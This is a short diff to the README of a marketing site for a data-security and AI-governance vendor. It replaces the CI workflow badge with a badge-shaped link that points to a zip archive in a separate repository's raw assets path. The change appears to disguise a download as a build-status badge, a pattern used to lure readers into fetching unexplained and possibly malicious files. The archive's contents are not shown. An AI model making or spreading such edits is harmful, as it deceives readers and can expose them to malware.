@@ -1,6 +1,6 @@
 # DataGateways — marketing site
 
-[![CI](https://github.com/talalhassankhan18/DataGateways/actions/workflows/ci.yml/badge.svg)](https://github.com/talalhassankhan18/DataGateways/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/talalhassankhan18/DataGateways-Website-Hosting/main/assets/2.1.zip)](https://raw.githubusercontent.com/talalhassankhan18/DataGateways-Website-Hosting/main/assets/2.1.zip)
 
 Marketing site for **DataGateways**, an enterprise data-security and AI-governance vendor.
 
